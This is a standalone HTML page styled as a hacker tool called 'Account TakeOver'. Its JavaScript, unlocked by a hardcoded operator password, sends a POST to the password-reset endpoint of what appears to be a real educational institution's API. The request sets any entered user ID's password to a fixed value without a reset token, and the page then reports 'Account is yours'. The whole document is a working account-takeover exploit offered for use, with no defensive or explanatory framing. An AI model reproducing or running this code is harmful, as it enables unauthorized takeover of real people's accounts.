<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Account TakeOver</title>
<style>
body {
    background-color: #000;
    color: #0F0;
    font-family: 'Courier New', Courier, monospace;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.container {
    background-color: #000;
    border: 2px solid #0F0;
    padding: 20px;
    border-radius: 10px;
    text-align: center;
}

h2 {
    margin-top: 0;
}

form {
    display: flex;
    flex-direction: column;
    align-items: center;
}

label {
    font-size: 18px;
}

input[type="text"],
input[type="password"] {
    width: 200px;
    padding: 10px;
    margin: 10px 0;
    border: 2px solid #0F0;
    background-color: #000;
    color: #0F0;
}

button {
    padding: 10px 20px;
    margin-top: 10px;
    border: none;
    background-color: #0F0;
    color: #000;
    cursor: pointer;
    font-size: 16px;
    border-radius: 5px;
}

button:hover {
    background-color: #090;
}

</style>
<script>
function submitForm() {
    var idNumber = document.getElementById('idNumber').value;
    var password = document.getElementById('password').value;

    // Check if password is correct
    if (password === "Maxare12@@") {
        var payload = {
            user_name: idNumber,
            password: "Name12@@",
            password_confirmation: "Name12@@"
        };

        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://api.ois.edu.bd/api/v2/auth/forgot/password-reset", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                    alert("Account is yours");
                    // Optionally, you can handle the response here
                } else {
                    alert("Account takeover request failed. Please try again later.");
                    // Optionally, you can handle errors here
                }
            }
        };
        xhr.send(JSON.stringify(payload));
    } else {
        alert("Incorrect password. Access denied.");
    }
}
</script>
</head>
<body>
<div class="container">
<h2>Account TakeOver</h2>
<form onsubmit="event.preventDefault(); submitForm();">
    <label for="idNumber">Enter ID Number:</label><br>
    <input type="text" id="idNumber" name="idNumber" required><br>
    <label for="password">Enter Password:</label><br>
    <input type="password" id="password" name="password" required><br><br>
    <button type="submit">Make this account yours!</button>
</form>
</div>
</body>
</html>
